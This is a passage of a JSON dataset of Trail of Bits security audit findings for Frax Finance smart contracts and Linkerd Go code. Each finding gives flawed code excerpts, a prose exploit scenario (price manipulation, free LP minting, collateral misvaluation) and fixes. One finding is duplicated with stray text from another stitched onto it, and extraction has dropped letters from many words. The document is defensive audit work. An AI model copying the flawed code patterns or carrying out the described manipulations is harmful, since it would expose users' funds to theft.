        "description": "The FXS1559 documentation states that excess FRAX tokens are exchanged for FXS tokens, and the FXS tokens are then burned. However, the reality is that those FXS tokens are redistributed to veFXS holders. More specically, the documentation states the following: Specically, every time interval t, FXS1559 calculates the excess value above the CR [collateral ration] and mints FRAX in proportion to the collateral ratio against the value. It then uses the newly minted currency to purchase FXS on FRAX-FXS AMM pairs and burn it. However, in the FXS1559_AMO_V3 contract, the number of FXS tokens that are burned is a tunable parameter (see gures 16.1 and 16.2). The parameter defaults to, and is currently, 0 (according to Etherscan). burn_fraction = 0 ; // Give all to veFXS initially Figure 16.1: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L87 // Calculate the amount to burn vs give to the yield distributor uint256 amt_to_burn = fxs_received. mul (burn_fraction). div (PRICE_PRECISION); uint256 amt_to_yield_distributor = fxs_received. sub (amt_to_burn); // Burn some of the FXS burnFXS (amt_to_burn); // Give the rest to the yield distributor FXS. approve ( address (yieldDistributor), amt_to_yield_distributor); yieldDistributor. notifyRewardAmount (amt_to_yield_distributor); Figure 16.2: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L159-L168 Exploit Scenario Frax Finance is publicly shamed for claiming that FXS is deationary when it is not. Condence in FRAX declines, and it loses its peg as a result. Recommendations Short term, correct the documentation to indicate that some proportion of FXS tokens may be distributed to veFXS holders. This will help users to form correct expectations regarding the operation of the protocol. Long term, consider whether FXS tokens need to be redistributed. The documentation makes a compelling argument for burning FXS tokens. Adjusting the code to match the documentation might be a better way of resolving this discrepancy.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "18. calc_withdraw_one_coin is vulnerable to manipulation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The showAllocations function determines the amount of collateral in dollars that a contract holds. calc_withdraw_one_coin is a Curve AMM function based on the current state of the pool and changes as trades are made through the pool. This spot price can be manipulated using a ash loan or large trade similar to the one described in TOB-FRSOL-006 . function showAllocations () public view returns (uint256[ 10 ] memory return_arr) { // ------------LP Balance------------ // Free LP uint256 lp_owned = (mim3crv_metapool.balanceOf(address(this))); // Staked in the vault uint256 lp_value_in_vault = MIM3CRVInVault(); lp_owned = lp_owned.add(lp_value_in_vault); // ------------3pool Withdrawable------------ uint256 mim3crv_supply = mim3crv_metapool.totalSupply(); uint256 mim_withdrawable = 0 ; uint256 _3pool_withdrawable = 0 ; if (lp_owned > 0 ) _3pool_withdrawable = mim3crv_metapool.calc_withdraw_one_coin(lp_owned, 1 ); // 1: 3pool index Figure 18.1: contracts/Misc_AMOs/MIM_Convex_AMO.sol#L145-160 Exploit Scenario MIM_Convex_AMO is included in FRAX.globalCollateralValue , and the FraxPoolV3.bonus_rate is nonzero. An attacker manipulates the return value of calc_withdraw_one_coin , causing the protocol to undervalue the collateral and reach a less-than-desired collateralization ratio. The attacker then calls FraxPoolV3.recollateralize , adds collateral, and sells the newly minted FXS tokens, including a bonus, for prot. Recommendations Short term, do not use the Curve AMM spot price to value collateral. Long term, use an oracle or get_virtual_price to reduce the likelihood of manipulation. References  Medium, \"Economic Attack on Harvest FinanceDeep Dive\"",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Incorrect valuation of LP tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The Frax Protocol uses liquidity pool (LP) tokens as collateral and includes their value in the global collateralization value. In addition to the protocols incorrect inclusion of FRAX as collateral (see TOB-FRSOL-024 ), the calculation of the value pool tokens representing Uniswap V2-like and Uniswap V3 positions is inaccurate. As a result, the global collateralization value could be incorrect. getAmount0ForLiquidity ( getAmount1ForLiquidity) returns the amount, not the value, of token0 (token1) in that price range; the price of FRAX should not be assumed to be $1, for the same reasons outlined in TOB-FRSOL-017 . The userStakedFrax helper function uses the metadata of each Uniswap V3 NFT to calculate the collateral value of the underlying tokens. Rather than using the current range, the function calls getAmount0ForLiquidty using the range set by a liquidity provider. This suggests that the current price of the assets is within the range set by the liquidity provider, which is not necessarily the case. If the market price is outside the given range, the underlying position will contain 100% of one token rather than a portion of both tokens. Thus, the underlying tokens will not be at a 50% allocation at all times, so this assumption is false. The actual redemption value of the NFT is not the same as what was deposited since the underlying token amounts and prices change with market conditions. In short, the current calculation does not update correctly as the price of assets change, and the global collateral value will be wrong. function userStakedFrax (address account ) public view returns (uint256) { uint256 frax_tally = 0 ; LockedNFT memory thisNFT; for (uint256 i = 0 ; i < lockedNFTs[account].length; i++) { thisNFT = lockedNFTs[account][i]; uint256 this_liq = thisNFT.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_lower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_upper); if (frax_is_token0){ frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } } } // In order to avoid excessive gas calculations and the input tokens ratios. 50% FRAX is assumed // If this were Uni V2, it would be akin to reserve0 & reserve1 math // There may be a more accurate way to calculate the above... return frax_tally.div( 2 ); } Figure 19.1: contracts/Staking/FraxUniV3Farm_Volatile.sol#L241-L263 In addition, the value of Uniswap V2 LP tokens is calculated incorrectly. The return value of getReserves is vulnerable to manipulation, as described in TOB-FRSOL-006 . Thus, the value should not be used to price LP tokens, as the value will vary signicantly when trades are performed through the given pool. Imprecise uctuations in the LP tokens values will result in an inaccurate global collateral value. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } Figure 19.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L217 Exploit Scenario The value of LP positions does not reect a sharp decline in the market value of the underlying tokens. Rather than incentivizing recollateralization, the protocol continues to mint FRAX tokens and causes the true collateralization ratio to fall even further. Although the protocol appears to be solvent, due to incorrect valuations, it is not. Recommendations Short term, discontinue the use of LP tokens as collateral since the valuations are inaccurate and misrepresent the amount of collateral backing FRAX. Long term, use oracles to derive the fair value of LP tokens. For Uniswap V2, this means using the constant product to compute the value of the underlying tokens independent of the spot price. For Uniswap V3, this means using oracles to determine the current composition of the underlying tokens that the NFT represents. References   Christophe Michel, \"Pricing LP tokens | Warp Finance hack\" Alpha Finance, \"Fair Uniswap's LP Token Pricing\"",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "20. Missing check of return value of transfer and transferFrom ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "Some tokens, such as BAT, do not precisely follow the ERC20 specication and will return false or fail silently instead of reverting. Because the codebase does not consistently use OpenZeppelins SafeERC20 library, the return values of calls to transfer and transferFrom should be checked. However, return value checks are missing from these calls in many areas of the code, opening the TWAMM contract (the time-weighted automated market maker) to severe vulnerabilities. function provideLiquidity(uint256 lpTokenAmount) external { require (totalSupply() != 0 , 'EC3' ); //execute virtual orders longTermOrders.executeVirtualOrdersUntilCurrentBlock(reserveMap); //the ratio between the number of underlying tokens and the number of lp tokens must remain invariant after mint uint256 amountAIn = lpTokenAmount * reserveMap[tokenA] / totalSupply(); uint256 amountBIn = lpTokenAmount * reserveMap[tokenB] / totalSupply(); ERC20(tokenA).transferFrom( msg.sender , address( this ), amountAIn); ERC20(tokenB).transferFrom( msg.sender , address( this ), amountBIn); [...] Figure 20.1: contracts/FPI/TWAMM.sol#L125-136 Exploit Scenario Frax deploys the TWAMM contract. Pools are created with tokens that do not revert on failure, allowing an attacker to call provideLiquidity and mint LP tokens for free; the attacker does not have to deposit funds since the transferFrom call fails silently or returns false . Recommendations Short term, x the instance described above. Then, x all instances detected by slither . --detect unchecked-transfer . Long term, review the Token Integration Checklist in appendix D and integrate Slither into the projects CI pipeline to prevent regression and catch new instances proactively.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "21. A rewards distributor does not exist for each reward token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The FraxUnifiedFarmTemplate contracts setGaugeController function (gure 21.1) has the onlyTknMgrs modier. All other functions with the onlyTknMgrs modier set a value in an array keyed only to the calling token managers token index. Except for setGaugeController , which sets the global rewards_distributor state variable, all other functions that set global state variables have the onlyByOwnGov modier. This modier is stricter than onlyTknMgrs , in that it cannot be called by token managers. As a result, any token manager can set the rewards distributor that will be used by all tokens. This exposes the underlying issue: there should be a rewards distributor for each token instead of a single global distributor, and a token manager should be able to set the rewards distributor only for her token. function setGaugeController ( address reward_token_address , address _rewards_distributor_address , address _gauge_controller_address ) external onlyTknMgrs(reward_token_address) { gaugeControllers[rewardTokenAddrToIdx[reward_token_address]] = _gauge_controller_address; rewards_distributor = IFraxGaugeFXSRewardsDistributor(_rewards_distributor_address); } Figure 21.1: The setGaugeController function ( FraxUnifiedFarmTemplate.sol#639642 ) Exploit Scenario Reward manager A calls setGaugeController to set his rewards distributor. Then, reward manager B calls setGaugeController to set his rewards distributor, overwriting the rewards distributor that A set. Later, sync is called, which in turn calls retroCatchUp . As a result, distributeRewards is called on Bs rewards distributor; however, distributeRewards is not called on As rewards distributor. Recommendations Short term, replace the global rewards distributor with an array that is indexed by token index to store rewards distributors, and ensure that the system calls distributeRewards on all reward distributors within the retroCatchUp function. Long term, ensure that token managers cannot overwrite each others settings.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "22. minVeFXSForMaxBoost can be manipulated to increase rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "minVeFXSForMaxBoost is calculated based on the current spot price when a user stakes Uniswap V2 LP tokens. If an attacker manipulates the spot price of the pool prior to staking LP tokens, the reward boost will be skewed upward, thereby increasing the amount of rewards earned. The attacker will earn outsized rewards relative to the amount of liquidity provided. function fraxPerLPToken () public view returns ( uint256 ) { // Get the amount of FRAX 'inside' of the lp tokens uint256 frax_per_lp_token ; // Uniswap V2 // ============================================ { [...] uint256 total_frax_reserves ; ( uint256 reserve0 , uint256 reserve1 , ) = (stakingToken.getReserves()); Figure 22.1: contracts/Staking/FraxCrossChainFarmSushi.sol#L242-L250 function userStakedFrax ( address account ) public view returns ( uint256 ) { return (fraxPerLPToken()).mul(_locked_liquidity[account]).div(1e18); } function minVeFXSForMaxBoost ( address account ) public view returns ( uint256 ) { return (userStakedFrax(account)).mul(vefxs_per_frax_for_max_boost).div(MULTIPLIER_PRECISION ); } function veFXSMultiplier ( address account ) public view returns ( uint256 ) { if ( address (veFXS) != address ( 0 )){ // The claimer gets a boost depending on amount of veFXS they have relative to the amount of FRAX 'inside' // of their locked LP tokens uint256 veFXS_needed_for_max_boost = minVeFXSForMaxBoost(account); [...] Figure 22.2: contracts/Staking/FraxCrossChainFarmSushi.sol#L260-L272 Exploit Scenario An attacker sells a large amount of FRAX through the incentivized Uniswap V2 pool, increasing the amount of FRAX in the reserve. In the same transaction, the attacker calls stakeLocked and deposits LP tokens. The attacker's reward boost, new_vefxs_multiplier , increases due to the large trade, giving the attacker outsized rewards. The attacker then swaps his tokens back through the pool to prevent losses. Recommendations Short term, do not use the Uniswap spot price to calculate reward boosts. Long term, use canonical and audited rewards contracts for Uniswap V2 liquidity mining, such as MasterChef.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "23. Most collateral is not directly redeemable by depositors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The following describes the on-chain situation on December 20, 2021. The Frax stablecoin has a total supply of 1.5 billion FRAX. Anyone can mint new FRAX tokens by calling FraxPoolV3.mintFrax and paying the necessary amount of collateral and FXS. Conversely, anyone can redeem his or her FRAX for collateral and FXS by calling FraxPoolV3.redeemFrax . However, the Frax team manually moves collateral from the FraxPoolV3 contract into AMO contracts in which the collateral is used to generate yield. As a result, only $5 million (0.43%) of the collateral backing FRAX remains in the FraxPoolV3 contract and is available for redemption. If those $5 million are redeemed, the Frax Finance team would have to manually move collateral from the AMOs to FraxPoolV3 to make further redemptions possible. Currently, $746 million (64%) of the collateral backing FRAX is managed by the ConvexAMO contract. FRAX owners cannot access the ConvexAMO contract, as all of its operations can be executed only by the Frax team. Exploit Scenario Owners of FRAX want to use the FraxPoolV3 contracts redeemFrax function to redeem more than $5 million worth of FRAX for the corresponding amount of collateral. The redemption fails, as only $5 million worth of USDC is in the FraxPoolV3 contract. From the redeemers' perspectives, FRAX is no longer exchangeable into something worth $1, removing the base for its stable price. Recommendations Short term, deposit more FRAX into the FraxPoolV3 contract so that the protocol can support a larger volume of redemptions without requiring manual intervention by the Frax team. Long term, implement a mechanism whereby the pools can retrieve FRAX that is locked in AMOs to pay out redemptions.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "24. FRAX.globalCollateralValue counts FRAX as collateral ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "Each unit of FRAX represents $1 multiplied by the collateralization ratio of debt. That is, if the collateralization ratio is 86%, the Frax Protocol owes each holder of FRAX $0.86. Instead of accounting for this as a liability, the protocol includes this debt as an asset backing FRAX. In other words, FRAX is backed in part by FRAX. Because the FRAX.globalCollateralValue includes FRAX as an asset and not debt, the true collateralization ratio is lower than stated, and users cannot redeem FRAX for the underlying collateral in mass for reasons beyond those described in TOB-FRSOL-023 . This issue occurs extensively throughout the code. For instance, the amount FRAX in a Uniswap V3 liquidity position is included in the contracts collateral value. function TotalLiquidityFrax () public view returns ( uint256 ) { uint256 frax_tally = 0 ; Position memory thisPosition; for ( uint256 i = 0 ; i < positions_array.length; i++) { thisPosition = positions_array[i]; uint128 this_liq = thisPosition.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickLower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickUpper); if (thisPosition.collateral_address > 0x853d955aCEf822Db058eb8505911ED77F175b99e ){ // if address(FRAX) < collateral_address, then FRAX is token0 frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } } } Figure 24.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L199-L216 In another instance, the value of FRAX in FRAX/token liquidity positions on Arbitrum is counted as collateral. Again, FRAX should be counted as debt and not collateral. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } // Get the token rates return_info[ 0 ] = (reserve_pack[ 0 ] * 1e18) / (the_pair.totalSupply()); return_info[ 1 ] = (reserve_pack[ 1 ] * 1e18) / (the_pair.totalSupply()); return_info[ 2 ] = (reserve_pack[ 2 ] * 1e18) / (the_pair.totalSupply()); // Set the pair type (used later) if (return_info[ 0 ] > 0 && return_info[ 1 ] == 0 ) return_info[ 3 ] = 0 ; // FRAX/XYZ else if (return_info[ 0 ] == 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 1 ; // FXS/XYZ else if (return_info[ 0 ] > 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 2 ; // FRAX/FXS else revert( \"Invalid pair\" ); } Figure 24.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L229 Exploit Scenario Users attempt to redeem FRAX for USDC, but the collateral backing FRAX is, in part, FRAX itself, and not enough collateral is available for redemption. The collateralization ratio does not accurately reect when the protocol is insolvent. That is, it indicates that FRAX is fully collateralized in the scenario in which 100% of FRAX is backed by FRAX. Recommendations Short term, revise FRAX.globalCollateralValue so that it does not count FRAX as collateral, and ensure that the protocol deposits the necessary amount of collateral to ensure the collateralization ratio is reached. Long term, after xing this issue, continue reviewing how the protocol accounts for collateral and ensure the design is sound.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization. 18. calc_withdraw_one_coin is vulnerable to manipulation Severity: High Diculty: High Type: Data Validation Finding ID: TOB-FRSOL-018 Target: MIM_Convex_AMO.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "25. Setting collateral values manually is error-prone ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "During the audit, the Frax Solidity team indicated that collateral located on non-mainnet chains is included in FRAX.globalCollateralValue in FRAXStablecoin , the Ethereum mainnet contract . (As indicated in TOB-FRSOL-023 , this collateral cannot currently be redeemed by users.) Using a script, the team aggregates collateral prices from across multiple chains and contracts and then posts that data to ManualTokenTrackerAMO by calling setDollarBalances . Since we did not have the opportunity to review the script and these contracts were out of scope, we cannot speak to the security of this area of the system. Other issues with collateral accounting and pricing indicate that this process needs review. Furthermore, considering the following issues, this privileged role and architecture signicantly increases the attack surface of the protocol and the likelihood of a hazard:     The correctness of the script used to calculate the data has not been reviewed, and users cannot audit or verify this data for themselves. The conguration of the Frax Protocol is highly complex, and we are not aware of how these interactions are tracked. It is possible that collateral can be mistakenly counted more than once or not at all. The reliability of the script and the frequency with which it is run is unknown. In times of market volatility, it is not clear whether the script will function as anticipated and be able to post updates to the mainnet. This role is not explained in the documentation or contracts, and it is not clear what guarantees users have regarding the collateralization of FRAX (i.e., what is included and updated). As of December 20, 2021, collatDollarBalance has not been updated since November 13, 2021 , and is equivalent to fraxDollarBalanceStored . This indicates that FRAX.globalCollateralValue is both out of date and incorrectly counts FRAX as collateral (see TOB-FRSOL-024 ). Recommendations Short term, include only collateral that can be valued natively on the Ethereum mainnet and do not include collateral that cannot be redeemed in FRAX.globalCollateralValue . Long term, document and follow rigorous processes that limit risk and provide condence to users. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Various unhandled errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "The linkerd codebase contains various methods with unhandled errors. In most cases, errors returned by functions are simply not checked; in other cases, functions that surround deferred error-returning functions do not capture the relevant errors. Using gosec and errcheck, we detected a large number of such cases, which we cannot enumerate in this report. We recommend running these tools to uncover and resolve these cases. Figures 1.1 and 1.2 provide examples of functions in the codebase with unhandled errors: func (h *handler) handleProfileDownload(w http.ResponseWriter, req *http.Request, params httprouter.Params) { [...] w.Write(profileYaml.Bytes()) } Figure 1.1: web/srv/handlers.go#L65-L91 func renderStatStats(rows []*pb.StatTable_PodGroup_Row, options *statOptions) string { [...] writeStatsToBuffer(rows, w, options) w.Flush() [...] } Figure 1.2: viz/cmd/stat.go#L295-L302 We could not determine the severity of all of the unhandled errors detected in the codebase. Exploit Scenario While an operator of the Linkerd infrastructure interacts with the system, an uncaught error occurs. Due to the lack of error reporting, the operator is unaware that the operation did not complete successfully, and he produces further undened behavior. Recommendations Short term, run gosec and errcheck across the codebase. Resolve all issues pertaining to unhandled errors by checking them explicitly. Long term, ensure that all functions that return errors have explicit checks for these errors. Consider integrating the abovementioned tooling into the CI/CD pipeline to prevent undened behavior from occurring in the aected code paths.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. The use of time.After() in select statements can lead to memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. wait: for { select { case result := <-resultChan: results = append(results, result) case <-time.After(waitingTime): break wait // timed out } if atomic.LoadInt32(&activeRoutines) == 0 { break } } Figure 2.1: cli/cmd/metrics_diagnostics_util.go#L131-L142 Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Use of string.Contains instead of string.HasPrex to check for prexes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "When formatting event metadata, the formatMetadata method checks whether a given string in the metadata map contains a given prex. However, rather than using string.HasPrefix to perform this check, it uses string.Contains, which returns true if the given prex string is located anywhere in the target string. for k, v := range meta { if strings.Contains(k, consts.Prefix) || strings.Contains(k, consts.ProxyConfigAnnotationsPrefix) { metadata = append(metadata, fmt.Sprintf(\"%s=%s\", k, v)) } } Figure 3.1: multicluster/service-mirror/events_formatting.go#L23-L27 Recommendations Short term, refactor the prex checks to use string.HasPrefix rather than string.Contains. This will ensure that prexes within strings are properly validated.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "4. Risk of resource exhaustion due to the use of defer inside a loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "The runCheck function, responsible for performing health checks for various services, performs its core functions inside of an innite for loop. runCheck is called with a timeout stored in a context object. The cancel() function is deferred at the beginning of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each context object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call cancel() at the end of each loop to prevent unforeseen issues. func (hc *HealthChecker) runCheck(category *Category, c *Checker, observer CheckObserver) bool { for { ctx, cancel := context.WithTimeout(context.Background(), RequestTimeout) defer cancel() err := c.check(ctx) if se, ok := err.(*SkipError); ok { log.Debugf(\"Skipping check: %s. Reason: %s\", c.description, se.Reason) return true } Figure 4.1: pkg/healthcheck/healthcheck.go#L1619-L1628 Recommendations Short term, rather than deferring the call to cancel(), add a call to cancel() at the end of the loop.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Lack of maximum request and response body constraint ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File Purpose controller/heartbeat/heartbeat.go:239 Reads responses for heartbeat requests pkg/profiles/openapi.go:32 pkg/version/channels.go:83 controller/webhook/server.go:124 pkg/protohttp/protohttp.go:48 pkg/protohttp/protohttp.go:170 Reads the body of le for the profile command Reads responses from requests for obtaining Linkerd versions Reads requests for the webhook and metrics servers Reads all requests sent to the metrics and TAP APIs Reads error responses from the metrics and TAP APIs In the case of pkg/protohttp/protohttp.go, the readAll function can be called to read POST requests, making it easier for an attacker to exploit the misuse of the ReadAll function. Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limitation can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Potential goroutine leak in Kubernetes port-forwarding initialization logic ",
